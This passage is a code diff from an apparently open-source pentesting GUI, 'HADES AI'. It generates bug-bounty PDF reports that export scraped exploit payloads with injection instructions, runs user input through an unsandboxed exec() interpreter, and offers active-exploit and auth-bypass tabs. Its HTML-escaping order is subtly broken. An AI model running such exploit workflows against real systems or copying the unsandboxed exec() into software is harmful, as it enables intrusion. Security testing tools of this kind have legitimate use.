+                    <b>Step-by-Step Reproduction:</b><br/>
+                    <b>1.</b> Open browser Developer Tools (F12) → Network tab<br/>
+                    <b>2.</b> Navigate to the affected domain: <font face='Courier'>{domain_context}</font><br/>
+                    <b>3.</b> Locate the cached resource in browser cache directory:<br/>
+                    &nbsp;&nbsp;&nbsp;&nbsp;<font face='Courier' size='7'>{f['path'][-80:]}</font><br/>
+                    <b>4.</b> Search for the malicious pattern:<br/>
+                    &nbsp;&nbsp;&nbsp;&nbsp;<font face='Courier' size='7'>{f.get('pattern', 'N/A')[:60]}</font><br/>
+                    <b>5.</b> Observe the vulnerable code at the location indicated<br/>
+                    <b>6.</b> To trigger: Clear cache, revisit the page, monitor for code execution in Console tab<br/><br/>
+                    
+                    <b>cURL Command (if applicable):</b><br/>
+                    <font face='Courier' size='7'>curl -v "https://{domain_context}/[endpoint]" | grep -i "{f.get('pattern', 'pattern')[:20]}"</font>
+                    """
+                    elements.append(Paragraph(repro_steps, impact_style))
+                    
+                    # ========== REMEDIATION ==========
+                    elements.append(Paragraph("<b>Recommended Remediation:</b>", label_style))
+                    remediation_map = {
+                        'eval_code': 'Remove eval() usage. Use JSON.parse() for data, avoid dynamic code execution. Implement strict CSP.',
+                        'injection': 'Implement Content Security Policy (CSP). Sanitize all user inputs. Use httpOnly/Secure cookie flags.',
+                        'data_exfil': 'Review code accessing document.cookie/localStorage. Implement CSP connect-src directive.',
+                        'obfuscation': 'Investigate obfuscated code. Deobfuscate and review for malicious functionality. Use SRI for scripts.',
+                        'malware': 'Quarantine file immediately. Full system scan. Investigate supply chain. Reset credentials.',
+                        'exploit': 'Patch vulnerable software. Review exploitation attempt origin. Block malicious IPs. Enable WAF.',
+                        'backdoor': 'Isolate affected system. Full forensic analysis. Reset all credentials. Review access logs.',
+                        'crypto': 'Remove cryptomining code. Audit third-party scripts. Implement Subresource Integrity (SRI).'
+                    }
+                    elements.append(Paragraph(
+                        remediation_map.get(threat_type, 'Investigate the finding and apply appropriate security controls.'),
+                        impact_style
+                    ))
+                    
+                    # References
+                    elements.append(Paragraph("<b>References:</b>", label_style))
+                    elements.append(Paragraph(
+                        f"• {impact_info['cwe']}: https://cwe.mitre.org/data/definitions/{self._extract_cwe_id(impact_info['cwe'])}.html<br/>"
+                        f"• OWASP: https://owasp.org/Top10/<br/>"
+                        f"• NVD: https://nvd.nist.gov/",
+                        ParagraphStyle('Ref', parent=impact_style, fontSize=7, textColor=colors.HexColor('#0066cc'))
+                    ))
+                    
+                    elements.append(Spacer(1, 25))
+                    
+                    if idx % 2 == 0:
+                        elements.append(PageBreak())
+                
+                elements.append(PageBreak())
+            
+            # ========== LEARNED EXPLOITS ==========
+            if exploits:
+                elements.append(Paragraph("3. Learned Exploit Database", heading_style))
+                elements.append(Paragraph(
+                    """The following exploits were learned from external sources and cached content analysis.
+                    Each exploit includes verification status, context, and usage guidance.""",
+                    normal_style
+                ))
+                elements.append(Spacer(1, 15))
+                
+                # Exploit type descriptions with CWE mapping
+                exploit_cwe_map = {
+                    'xss': {'cwe': 'CWE-79', 'name': 'Cross-Site Scripting', 'severity': 'Medium-High'},
+                    'sqli': {'cwe': 'CWE-89', 'name': 'SQL Injection', 'severity': 'Critical'},
+                    'rce': {'cwe': 'CWE-94', 'name': 'Remote Code Execution', 'severity': 'Critical'},
+                    'lfi': {'cwe': 'CWE-98', 'name': 'Local File Inclusion', 'severity': 'High'},
+                    'rfi': {'cwe': 'CWE-98', 'name': 'Remote File Inclusion', 'severity': 'Critical'},
+                    'ssrf': {'cwe': 'CWE-918', 'name': 'Server-Side Request Forgery', 'severity': 'High'},
+                    'xxe': {'cwe': 'CWE-611', 'name': 'XML External Entity', 'severity': 'High'},
+                    'csrf': {'cwe': 'CWE-352', 'name': 'Cross-Site Request Forgery', 'severity': 'Medium'},
+                    'idor': {'cwe': 'CWE-639', 'name': 'Insecure Direct Object Reference', 'severity': 'Medium-High'},
+                    'auth_bypass': {'cwe': 'CWE-287', 'name': 'Authentication Bypass', 'severity': 'Critical'},
+                }
+                
+                exploit_types = {}
+                for e in exploits:
+                    t = e['exploit_type']
+                    if t not in exploit_types:
+                        exploit_types[t] = []
+                    exploit_types[t].append(e)
+                
+                for exploit_type, type_exploits in exploit_types.items():
+                    exploit_info = exploit_cwe_map.get(exploit_type.lower(), {
+                        'cwe': 'CWE-Unknown', 'name': exploit_type, 'severity': 'TBD'
+                    })
+                    
+                    elements.append(Paragraph(
+                        f"<b>{exploit_type.upper().replace('_', ' ')}</b> ({len(type_exploits)} variants)",
+                        subheading_style
+                    ))
+                    
+                    # Exploit type metadata
+                    elements.append(Paragraph(
+                        f"<b>Category:</b> {exploit_info['name']} | "
+                        f"<b>CWE:</b> {exploit_info['cwe']} | "
+                        f"<b>Typical Severity:</b> {exploit_info['severity']}",
+                        ParagraphStyle('Meta', parent=impact_style, fontSize=8, textColor=colors.HexColor('#666'))
+                    ))
+                    elements.append(Spacer(1, 5))
+                    
+                    for i, exploit in enumerate(type_exploits[:10], 1):
+                        elements.append(Paragraph(f"<b>Variant #{i}</b>", label_style))
+                        
+                        # Source and verification
+                        elements.append(Paragraph(f"<b>Source URL:</b> {exploit['source_url']}", impact_style))
+                        elements.append(Paragraph(f"<b>Learned:</b> {exploit['learned_at'][:16]}", impact_style))
+                        
+                        success_rate = exploit['success_count'] / max(1, exploit['success_count'] + exploit['fail_count'])
+                        verification_status = 'Verified' if success_rate > 0.5 else 'Unverified - Testing Required'
+                        status_color = '#4CAF50' if success_rate > 0.5 else '#ffa500'
+                        
+                        elements.append(Paragraph(
+                            f"<b>Verification:</b> <font color='{status_color}'>{verification_status}</font> "
+                            f"(Success Rate: {success_rate:.0%})",
+                            impact_style
+                        ))
+                        
+                        # Context for the exploit
+                        elements.append(Paragraph("<b>Exploit Context:</b>", label_style))
+                        context_text = f"""
+                        • <b>Input Parameter:</b> Extracted from source URL path/query<br/>
+                        • <b>Expected Response:</b> Application-specific - verify manually<br/>
+                        • <b>Testing Notes:</b> Use in authorized environments only
+                        """
+                        elements.append(Paragraph(context_text, 
+                            ParagraphStyle('Context', parent=impact_style, fontSize=8)))
+                        
+                        elements.append(Paragraph("<b>Payload:</b>", label_style))
+                        code = exploit['code'][:600].replace('<', '&lt;').replace('>', '&gt;').replace('&', '&amp;')
+                        code_lines = code.split('\n')
+                        formatted_code = '<br/>'.join(code_lines[:12])
+                        elements.append(Paragraph(f"<font face='Courier' size='7'>{formatted_code}</font>", code_style))
+                        
+                        # How to use
+                        elements.append(Paragraph("<b>Usage Instructions:</b>", label_style))
+                        elements.append(Paragraph(
+                            "1. Identify target endpoint matching exploit type<br/>"
+                            "2. Modify payload parameters for target context<br/>"
+                            "3. Use Burp Suite/OWASP ZAP to inject payload<br/>"
+                            "4. Observe response for vulnerability indicators",
+                            ParagraphStyle('Usage', parent=impact_style, fontSize=8)
+                        ))
+                        
+                        elements.append(Spacer(1, 15))
+                    
+                    elements.append(Spacer(1, 10))
+                
+                elements.append(PageBreak())
+            
+            # ========== SECURITY PATTERNS ==========
+            if patterns:
+                elements.append(Paragraph("4. Learned Security Patterns", heading_style))
+                
+                patterns_data = [['Pattern Type', 'Signature', 'Confidence', 'Occurrences']]
+                for p in patterns[:50]:
+                    sig = p.signature[:45].replace('<', '&lt;').replace('>', '&gt;')
+                    patterns_data.append([
+                        p.pattern_type,
+                        sig,
+                        f"{p.confidence:.0%}",
+                        str(p.occurrences)
+                    ])
+                
+                patterns_table = Table(patterns_data, colWidths=[1.3*inch, 3.5*inch, 0.9*inch, 0.9*inch])
+                patterns_table.setStyle(TableStyle([
+                    ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#0f3460')),
+                    ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
+                    ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
+                    ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
+                    ('FONTSIZE', (0, 0), (-1, -1), 8),
+                    ('BOTTOMPADDING', (0, 0), (-1, 0), 10),
+                    ('BACKGROUND', (0, 1), (-1, -1), colors.HexColor('#f5f5f5')),
+                    ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor('#cccccc')),
+                    ('ROWBACKGROUNDS', (0, 1), (-1, -1), [colors.white, colors.HexColor('#f5f5f5')]),
+                ]))
+                elements.append(patterns_table)
+            
+            # ========== APPENDIX: SCREENSHOT PLACEHOLDERS ==========
+            elements.append(PageBreak())
+            elements.append(Paragraph("Appendix A: Evidence Screenshots", heading_style))
+            elements.append(Paragraph(
+                """
+                <i>This section is reserved for manual screenshot attachments.</i><br/><br/>
+                For complete bug bounty submissions, attach the following evidence:<br/>
+                • Browser console output showing the vulnerability<br/>
+                • Network tab showing malicious requests<br/>
+                • cURL commands to reproduce the issue<br/>
+                • Video proof-of-concept (if applicable)<br/><br/>
+                
+                <b>Recommended Tools for Evidence Collection:</b><br/>
+                • Burp Suite - Request/Response capture<br/>
+                • Browser DevTools - Console and Network logs<br/>
+                • Wireshark - Network traffic analysis<br/>
+                • OBS Studio - Video PoC recording
+                """,
+                normal_style
+            ))
+            
+            # ========== FOOTER ==========
+            elements.append(Spacer(1, 40))
+            elements.append(Paragraph(
+                "─" * 60,
+                ParagraphStyle('Line', alignment=TA_CENTER, textColor=colors.gray)
+            ))
+            elements.append(Paragraph(
+                "Generated by HADES AI - Self-Learning Pentesting Assistant<br/>"
+                "This report is confidential and intended for authorized recipients only.",
+                ParagraphStyle('Footer', parent=normal_style, 
+                              fontSize=8, textColor=colors.gray, alignment=TA_CENTER)
+            ))
+            
+            doc.build(elements)
+            
+            # Clear detections if requested
+            if clear_after:
+                self._clear_detections()
+            
+            return {
+                'success': True, 
+                'filepath': filepath,
+                'exploits_exported': len(exploits),
+                'findings_exported': min(len(findings), 30),
+                'patterns_exported': min(len(patterns), 50),
+                'cleared': clear_after
+            }
+            
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
+    
+    def _clear_detections(self):
+        with self.kb.lock:
+            cursor = self.kb.conn.cursor()
+            cursor.execute('DELETE FROM threat_findings')
+            cursor.execute('DELETE FROM learned_exploits')
+            cursor.execute('DELETE FROM cache_entries')
+            self.kb.conn.commit()
+    
+    def _get_owasp_category(self, threat_type: str) -> str:
+        """Map threat type to OWASP Top 10 category"""
+        owasp_map = {
+            'eval_code': 'A03:2021 Injection',
+            'injection': 'A03:2021 Injection',
+            'data_exfil': 'A01:2021 Broken Access Control',
+            'obfuscation': 'A09:2021 Security Logging Failures',
+            'malware': 'A08:2021 Software and Data Integrity',
+            'exploit': 'A03:2021 Injection',
+            'backdoor': 'A08:2021 Software and Data Integrity',
+            'crypto': 'A05:2021 Security Misconfiguration'
+        }
+        return owasp_map.get(threat_type, 'A00:2021 Unclassified')
+    
+    def _get_data_theft_risk(self, threat_type: str) -> str:
+        """Get data theft risk description"""
+        risk_map = {
+            'eval_code': 'HIGH - Arbitrary code can access all browser data',
+            'injection': 'HIGH - XSS can steal cookies, tokens, and form data',
+            'data_exfil': 'CRITICAL - Direct data exfiltration detected',
+            'obfuscation': 'MEDIUM - Hidden code may contain data theft logic',
+            'malware': 'CRITICAL - Malware typically includes data theft',
+            'exploit': 'HIGH - Exploitation often leads to data access',
+            'backdoor': 'CRITICAL - Full data access via persistent backdoor',
+            'crypto': 'LOW - Primarily resource theft, not data'
+        }
+        return risk_map.get(threat_type, 'UNKNOWN - Manual assessment required')
+    
+    def _get_session_risk(self, threat_type: str) -> str:
+        """Get session hijack risk description"""
+        risk_map = {
+            'eval_code': 'HIGH - Can steal session cookies and tokens',
+            'injection': 'HIGH - XSS commonly used for session hijacking',
+            'data_exfil': 'HIGH - Cookie exfiltration enables session hijack',
+            'obfuscation': 'MEDIUM - May hide session theft code',
+            'malware': 'HIGH - Session theft is common malware behavior',
+            'exploit': 'MEDIUM - Depends on exploit type',
+            'backdoor': 'HIGH - Persistent session access',
+            'crypto': 'LOW - Not typically session-focused'
+        }
+        return risk_map.get(threat_type, 'UNKNOWN - Manual assessment required')
+    
+    def _get_rce_risk(self, threat_type: str) -> str:
+        """Get remote code execution risk description"""
+        risk_map = {
+            'eval_code': 'CRITICAL - eval() enables direct code execution',
+            'injection': 'MEDIUM - Client-side only unless combined with other vulns',
+            'data_exfil': 'LOW - Data theft, not code execution',
+            'obfuscation': 'MEDIUM - May hide RCE payloads',
+            'malware': 'CRITICAL - Malware executes arbitrary code',
+            'exploit': 'CRITICAL - Exploits often target RCE',
+            'backdoor': 'CRITICAL - Full remote code execution capability',
+            'crypto': 'LOW - Typically limited to mining code'
+        }
+        return risk_map.get(threat_type, 'UNKNOWN - Manual assessment required')
+    
+    def _get_lateral_risk(self, threat_type: str) -> str:
+        """Get lateral movement risk description"""
+        risk_map = {
+            'eval_code': 'MEDIUM - Could be used to attack internal resources',
+            'injection': 'LOW - Browser-confined unless targeting intranet',
+            'data_exfil': 'MEDIUM - Stolen creds enable lateral movement',
+            'obfuscation': 'MEDIUM - May hide lateral movement code',
+            'malware': 'HIGH - Malware often spreads laterally',
+            'exploit': 'HIGH - Exploitation chains enable pivoting',
+            'backdoor': 'CRITICAL - Backdoors enable full network access',
+            'crypto': 'LOW - Focused on local resource consumption'
+        }
+        return risk_map.get(threat_type, 'UNKNOWN - Manual assessment required')
+    
+    def _extract_cwe_id(self, cwe_string: str) -> str:
+        """Extract CWE number from string like 'CWE-94: ...'"""
+        import re
+        match = re.search(r'CWE-(\d+)', cwe_string)
+        return match.group(1) if match else '0'
+    def dispatch(self, user_input):
+        user_input = user_input.strip()
+
+        if user_input.startswith("::mode"):
+            _, new_mode = user_input.split(" ", 1)
+            self.mode = new_mode.strip()
+            return f"🔁 Mode switched to: {self.mode}"
+
+        if self.mode == 'code':
+            return self.handle_code_interpreter(user_input)
+
+        elif self.mode == 'explain':
+            return self.explain_code(user_input)
+
+        else:
+            return self.handle_chat(user_input)
+
+    def handle_chat(self, user_input):
+        return f"[HadesAI] ✒️ Echoing in {self.personality}: {user_input}"
+
+    def handle_code_interpreter(self, code_str):
+        try:
+            old_stdout = sys.stdout
+            sys.stdout = mystdout = StringIO()
+            exec(code_str, {}, {})
+            output = mystdout.getvalue()
+            sys.stdout = old_stdout
+            return f"✅ Code executed.\nOutput:\n{output.strip()}"
+        except Exception as e:
+            sys.stdout = old_stdout
+            return f"❌ Execution Error:\n{traceback.format_exc()}"
+
+    def explain_code(self, code_str):
+        try:
+            tree = ast.parse(code_str)
+            explanations = []
+            for node in tree.body:
+                if isinstance(node, ast.FunctionDef):
+                    args = [arg.arg for arg in node.args.args]
+                    explanations.append(
+                        f"📘 Function `{node.name}` takes args: {args}"
+                    )
+                elif isinstance(node, ast.Import):
+                    modules = [alias.name for alias in node.names]
+                    explanations.append(f"📦 Imports modules: {modules}")
+                elif isinstance(node, ast.ImportFrom):
+                    modules = [alias.name for alias in node.names]
+                    explanations.append(f"📦 From {node.module} import {modules}")
+                elif isinstance(node, ast.Assign):
+                    targets = [ast.unparse(t) for t in node.targets]
+                    explanations.append(f"🔧 Variable(s) assigned: {targets}")
+            return "\n".join(explanations) if explanations else "ℹ️ No recognizable constructs to explain."
+        except Exception as e:
+            return f"❌ Explanation Error:\n{traceback.format_exc()}"
+
+# ============================================================================
+# GUI
+# ============================================================================
+
+class HadesGUI(QMainWindow):
+    DONATE_URL = "https://buy.stripe.com/28EbJ1f7ceo3ckyeES5kk00"
+    
+    def __init__(self):
+        super().__init__()
+        self.ai = HadesAI()
+        self.scanner = None
+        self.tool_executor = None
+        self.network_monitor = None
+        self.brain = pcore.load_brain()
+        self.init_ui()
+        self._show_startup_dialog()
+        
+    def init_ui(self):
+        self.setWindowTitle("HADES AI - Interactive Pentesting Assistant")
+        self.setMinimumSize(1400, 900)
+        self.setStyleSheet(self._get_style())
+        
+        central = QWidget()
+        self.setCentralWidget(central)
+        layout = QVBoxLayout(central)
+        
+        self.tabs = QTabWidget()
+        layout.addWidget(self.tabs)
+        
+        self.tabs.addTab(self._create_chat_tab(), "💬 AI Chat")
+        self.tabs.addTab(self._create_network_monitor_tab(), "🛡️ Network Monitor")
+        self.tabs.addTab(self._create_web_knowledge_tab(), "🧠 Web Knowledge")
+        self.tabs.addTab(self._create_tools_tab(), "🛠️ Tools & Targets")
+        self.tabs.addTab(self._create_exploit_tab(), "⚔️ Active Exploit")
+        self.tabs.addTab(self._create_injection_tab(), "💉 Request Injection")
+        self.tabs.addTab(self._create_auth_bypass_tab(), "🔓 Auth Bypass")
+        self.tabs.addTab(self._create_proxy_tab(), "🌐 Proxy Settings")
+        self.tabs.addTab(self._create_findings_tab(), "🔍 Threat Findings")
+        self.tabs.addTab(self._create_learned_tab(), "🧠 Learned Exploits")
+        self.tabs.addTab(self._create_cache_tab(), "📂 Cache Scanner")
+        self.tabs.addTab(self._create_code_tab(), "💻 Code Analysis")
+        self.tabs.addTab(self._create_code_helper_tab(), "💻 Code Helper")
+        self.tabs.addTab(self._create_autorecon_tab(), "🧠 AutoRecon")
+        self.tabs.addTab(self._create_modules_tab(), "🧩 Modules")
+        
+        self.status_bar = QStatusBar()
+        self.setStatusBar(self.status_bar)
+        self.progress = QProgressBar()
+        self.progress.setMaximumWidth(200)
+        self.progress.hide()
+        self.status_bar.addPermanentWidget(self.progress)
+        
+        # Donate button in status bar
+        donate_btn = QPushButton("💝 Support Development")
+        donate_btn.setStyleSheet("""
+            QPushButton { 
+                background: linear-gradient(45deg, #ff6b6b, #e94560); 
+                color: white; 
+                padding: 5px 15px; 
+                border-radius: 3px;
+                font-weight: bold;
+            }
+            QPushButton:hover { background: #ff8585; }
+        """)
+        donate_btn.clicked.connect(self._open_donate_link)
+        self.status_bar.addPermanentWidget(donate_btn)
+        
+    def _get_style(self) -> str:
+        return """
+            QMainWindow, QWidget { background-color: #1a1a2e; color: #eee; }
+            QTabWidget::pane { border: 1px solid #16213e; background: #16213e; }
+            QTabBar::tab { background: #16213e; color: #eee; padding: 10px 20px; }
+            QTabBar::tab:selected { background: #0f3460; border-bottom: 2px solid #e94560; }
+            QPushButton { background: #e94560; color: white; border: none; padding: 10px 20px; border-radius: 5px; font-weight: bold; }
+            QPushButton:hover { background: #ff6b6b; }
+            QPushButton:disabled { background: #444; }
+            QLineEdit, QTextEdit, QPlainTextEdit { background: #16213e; color: #eee; border: 1px solid #0f3460; border-radius: 5px; padding: 8px; font-family: Consolas; }
+            QTreeWidget, QTableWidget, QListWidget { background: #16213e; color: #eee; border: 1px solid #0f3460; alternate-background-color: #1a1a2e; }
+            QHeaderView::section { background: #0f3460; color: #eee; padding: 8px; border: none; }
+            QGroupBox { border: 1px solid #0f3460; border-radius: 5px; margin-top: 15px; padding-top: 15px; }
+            QGroupBox::title { color: #e94560; subcontrol-origin: margin; left: 10px; }
+            QScrollBar:vertical { background: #16213e; width: 12px; }
+            QScrollBar::handle:vertical { background: #0f3460; border-radius: 6px; }
+            QComboBox { background: #0f3460; color: #eee; padding: 8px; border-radius: 5px; }
+            QProgressBar { border: 1px solid #0f3460; border-radius: 5px; text-align: center; }
+            QProgressBar::chunk { background: #e94560; }
+        """
+    
+    def _show_startup_dialog(self):
+        """Show donation/welcome dialog on startup."""
+        import webbrowser
+        
+        dialog = QMessageBox(self)
+        dialog.setWindowTitle("Welcome to HADES AI")
+        dialog.setIconPixmap(dialog.style().standardPixmap(dialog.style().StandardPixmap.SP_MessageBoxInformation))
+        dialog.setText("""
+<h2 style='color: #e94560;'>🔥 HADES AI - Pentesting Assistant</h2>
+<p>Thank you for using HADES AI!</p>
+<p>This tool is <b>free and open source</b>. If you find it useful, 
+please consider supporting its development.</p>
+<p style='color: #4CAF50;'>Your support helps keep this project alive!</p>
+        """)
+        dialog.setTextFormat(Qt.TextFormat.RichText)
+        
+        donate_btn = dialog.addButton("💝 Donate Now", QMessageBox.ButtonRole.AcceptRole)
+        later_btn = dialog.addButton("Maybe Later", QMessageBox.ButtonRole.RejectRole)
+        
+        dialog.setStyleSheet("""
+            QMessageBox { background-color: #1a1a2e; }
+            QMessageBox QLabel { color: #eee; font-size: 12px; }
+            QPushButton { 
+                background: #e94560; 
+                color: white; 
+                padding: 8px 20px; 
+                border-radius: 5px; 
+                font-weight: bold;
+                min-width: 100px;
+            }
+            QPushButton:hover { background: #ff6b6b; }
+        """)
+        
+        dialog.exec()
+        
+        if dialog.clickedButton() == donate_btn:
+            webbrowser.open(self.DONATE_URL)
+    
+    def _open_donate_link(self):
+        """Open donation link in browser."""
+        import webbrowser
+        webbrowser.open(self.DONATE_URL)
+        
+    def _create_chat_tab(self) -> QWidget:
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+        
+        self.chat_display = QTextEdit()
+        self.chat_display.setReadOnly(True)
+        self.chat_display.setFont(QFont("Consolas", 11))
+        self.chat_display.setMinimumHeight(500)
+        layout.addWidget(self.chat_display)
+        
+        self._add_chat_message("system", "Welcome to HADES AI! I'm your interactive pentesting assistant.\n\nI can:\n• Scan ports, directories, and subdomains\n• Learn exploits from websites\n• Analyze browser cache for threats\n• Remember patterns and improve over time\n\nType 'help' for commands or just tell me what you want to do!")
+        
+        input_layout = QHBoxLayout()
+        self.chat_input = QLineEdit()
+        self.chat_input.setPlaceholderText("Talk to HADES... (e.g., 'scan ports on 192.168.1.1' or 'learn from https://...')")
+        self.chat_input.returnPressed.connect(self._send_chat)
+        self.chat_input.setMinimumHeight(40)
+        input_layout.addWidget(self.chat_input)
+        
+        send_btn = QPushButton("Send")
+        send_btn.clicked.connect(self._send_chat)
+        send_btn.setMinimumWidth(100)
+        input_layout.addWidget(send_btn)
+        
+        clear_btn = QPushButton("Clear")
+        clear_btn.clicked.connect(self._clear_chat)
+        clear_btn.setMinimumWidth(80)
+        clear_btn.setStyleSheet("background: #0f3460;")
+        input_layout.addWidget(clear_btn)
+        
+        layout.addLayout(input_layout)
+        
+        quick_layout = QHBoxLayout()
+        for cmd in ["help", "show stats", "scan browser cache"]:
+            btn = QPushButton(cmd)
+            btn.clicked.connect(lambda checked, c=cmd: self._quick_command(c))
+            btn.setStyleSheet("background: #0f3460;")
+            quick_layout.addWidget(btn)
+        layout.addLayout(quick_layout)
+        
+        return widget
+    
+    def _create_network_monitor_tab(self) -> QWidget:
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+        
+        # Control Panel
+        control_group = QGroupBox("🛡️ Network Defense Control")
+        control_layout = QHBoxLayout(control_group)
+        
+        self.monitor_start_btn = QPushButton("▶ Start Monitor")
+        self.monitor_start_btn.clicked.connect(self._start_network_monitor)
+        self.monitor_start_btn.setStyleSheet("background: #4CAF50;")
+        control_layout.addWidget(self.monitor_start_btn)
+        
+        self.monitor_stop_btn = QPushButton("⏹ Stop Monitor")
+        self.monitor_stop_btn.clicked.connect(self._stop_network_monitor)
+        self.monitor_stop_btn.setEnabled(False)
+        self.monitor_stop_btn.setStyleSheet("background: #f44336;")
+        control_layout.addWidget(self.monitor_stop_btn)
+        
+        control_layout.addWidget(QLabel("  |  "))
+        
+        self.defense_mode_check = QCheckBox("⚔️ Active Defense (Auto-block & counter)")
+        self.defense_mode_check.setStyleSheet("color: #ff6b6b; font-weight: bold;")
+        self.defense_mode_check.toggled.connect(self._toggle_defense_mode)
+        control_layout.addWidget(self.defense_mode_check)
+        
+        self.learning_mode_check = QCheckBox("🧠 Learning Mode")
+        self.learning_mode_check.setChecked(True)
+        self.learning_mode_check.setStyleSheet("color: #4CAF50;")
+        self.learning_mode_check.toggled.connect(self._toggle_learning_mode)
+        control_layout.addWidget(self.learning_mode_check)
+        
+        control_layout.addStretch()
+        layout.addWidget(control_group)
+        
+        # Stats Panel
+        stats_group = QGroupBox("📊 Real-Time Statistics")
+        stats_layout = QHBoxLayout(stats_group)
+        
+        self.net_stats_labels = {}
+        stat_items = [
+            ('runtime', 'Runtime', '00:00:00'),
+            ('total_connections', 'Connections', '0'),
+            ('threats_detected', 'Threats', '0'),
+            ('attacks_blocked', 'Blocked', '0'),
+            ('unique_ips', 'Unique IPs', '0'),
+            ('blocked_ips', 'Blocked IPs', '0'),
+        ]
+        
+        for key, label, default in stat_items:
+            frame = QGroupBox(label)
+            frame_layout = QVBoxLayout(frame)
+            stat_label = QLabel(default)
+            stat_label.setFont(QFont("Consolas", 16, QFont.Weight.Bold))
+            stat_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
+            if 'threat' in key or 'blocked' in key:
+                stat_label.setStyleSheet("color: #ff6b6b;")
+            else:
+                stat_label.setStyleSheet("color: #00fff2;")
+            frame_layout.addWidget(stat_label)
+            self.net_stats_labels[key] = stat_label
+            stats_layout.addWidget(frame)
+            
+        layout.addWidget(stats_group)
+        
+        # Main content splitter
+        splitter = QSplitter(Qt.Orientation.Horizontal)
+        
+        # Connection Log
+        conn_group = QGroupBox("🌐 Live Connections")
+        conn_layout = QVBoxLayout(conn_group)
+        self.connection_table = QTableWidget()
+        self.connection_table.setColumnCount(6)
+        self.connection_table.setHorizontalHeaderLabels(["Time", "Remote", "Local Port", "Process", "Status", "Threat"])
+        self.connection_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
+        self.connection_table.setAlternatingRowColors(True)
+        conn_layout.addWidget(self.connection_table)
+        splitter.addWidget(conn_group)
+        
+        # Threat Log
+        threat_group = QGroupBox("⚠️ Threat Detections")
+        threat_layout = QVBoxLayout(threat_group)
+        self.threat_table = QTableWidget()
+        self.threat_table.setColumnCount(5)
+        self.threat_table.setHorizontalHeaderLabels(["Time", "IP", "Type", "Level", "Details"])
+        self.threat_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
+        self.threat_table.setAlternatingRowColors(True)
+        threat_layout.addWidget(self.threat_table)
+        splitter.addWidget(threat_group)
+        
+        layout.addWidget(splitter)
+        
+        # Manual Controls
+        manual_group = QGroupBox("🔧 Manual Controls")
+        manual_layout = QHBoxLayout(manual_group)
+        
+        manual_layout.addWidget(QLabel("IP Address:"))
+        self.block_ip_input = QLineEdit()
+        self.block_ip_input.setPlaceholderText("Enter IP to block...")
+        manual_layout.addWidget(self.block_ip_input)
+        
+        block_btn = QPushButton("🚫 Block IP")
+        block_btn.clicked.connect(self._manual_block_ip)
+        block_btn.setStyleSheet("background: #f44336;")
+        manual_layout.addWidget(block_btn)
+        
+        unblock_btn = QPushButton("✅ Unblock IP")
+        unblock_btn.clicked.connect(self._manual_unblock_ip)
+        unblock_btn.setStyleSheet("background: #4CAF50;")
+        manual_layout.addWidget(unblock_btn)
+        
+        clear_threats_btn = QPushButton("🗑️ Clear Threats")
+        clear_threats_btn.clicked.connect(self._clear_threat_log)
+        clear_threats_btn.setStyleSheet("background: #0f3460;")
+        manual_layout.addWidget(clear_threats_btn)
+        
+        manual_layout.addStretch()
+        layout.addWidget(manual_group)
+        
+        # Status bar for network monitor
+        self.net_status_label = QLabel("🔴 Network Monitor INACTIVE - Click Start to begin monitoring")
+        self.net_status_label.setStyleSheet("padding: 10px; background: #0f3460; border-radius: 5px; font-size: 12px;")
+        layout.addWidget(self.net_status_label)
+        
+        return widget
+    def _create_modules_tab(self) -> QWidget:
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+
+        # Splitter for available and loaded modules
+        splitter = QSplitter(Qt.Orientation.Horizontal)
+
+        # Left side - Available Modules
+        available_group = QGroupBox("🧩 Available Modules")
+        available_layout = QVBoxLayout(available_group)
+        self.module_list = QListWidget()
+        self.module_list.setSelectionMode(QListWidget.SelectionMode.SingleSelection)
+        available_layout.addWidget(self.module_list)
+
+        # Load and Execute Buttons
+        btn_layout = QHBoxLayout()
+        self.load_btn = QPushButton("📥 Load Module")
+        self.load_btn.clicked.connect(self._load_selected_module)
+        btn_layout.addWidget(self.load_btn)
+
+        refresh_btn = QPushButton("🔄 Refresh")
+        refresh_btn.clicked.connect(self._refresh_module_list)
+        btn_layout.addWidget(refresh_btn)
+
+        available_layout.addLayout(btn_layout)
+        splitter.addWidget(available_group)
+
+        # Right side - Loaded Modules
+        loaded_group = QGroupBox("✅ Loaded Modules")
+        loaded_layout = QVBoxLayout(loaded_group)
+        self.loaded_modules_list = QListWidget()
+        self.loaded_modules_list.setSelectionMode(QListWidget.SelectionMode.SingleSelection)
+        loaded_layout.addWidget(self.loaded_modules_list)
+
+        exec_layout = QHBoxLayout()
+        self.exec_btn = QPushButton("▶ Execute Module")
+        self.exec_btn.clicked.connect(self._execute_selected_module)
+        self.exec_btn.setEnabled(False)
+        exec_layout.addWidget(self.exec_btn)
+
+        unload_btn = QPushButton("❌ Unload Module")
+        unload_btn.clicked.connect(self._unload_selected_module)
+        exec_layout.addWidget(unload_btn)
+
+        loaded_layout.addLayout(exec_layout)
+        splitter.addWidget(loaded_group)
+
+        layout.addWidget(splitter)
+
+        # Output Log
+        layout.addWidget(QLabel("🧾 Module Output:"))
+        self.module_output = QTextEdit()
+        self.module_output.setReadOnly(True)
+        self.module_output.setFont(QFont("Consolas", 10))
+        layout.addWidget(self.module_output)
+
+        self._refresh_module_list()
+        self._refresh_loaded_modules_list()
+
+        return widget
+    def _start_network_monitor(self):
+        if self.network_monitor and self.network_monitor.isRunning():
+            return
+            
+        self.network_monitor = NetworkMonitor(self.ai.kb)
+        self.network_monitor.connection_detected.connect(self._on_connection_detected)
+        self.network_monitor.threat_detected.connect(self._on_threat_detected)
+        self.network_monitor.status_update.connect(self._on_monitor_status)
+        self.network_monitor.stats_update.connect(self._on_stats_update)
+        
+        self.network_monitor.set_defense_mode(self.defense_mode_check.isChecked())
+        self.network_monitor.set_learning_mode(self.learning_mode_check.isChecked())
+        
+        self.network_monitor.start()
+        
+        self.monitor_start_btn.setEnabled(False)
+        self.monitor_stop_btn.setEnabled(True)
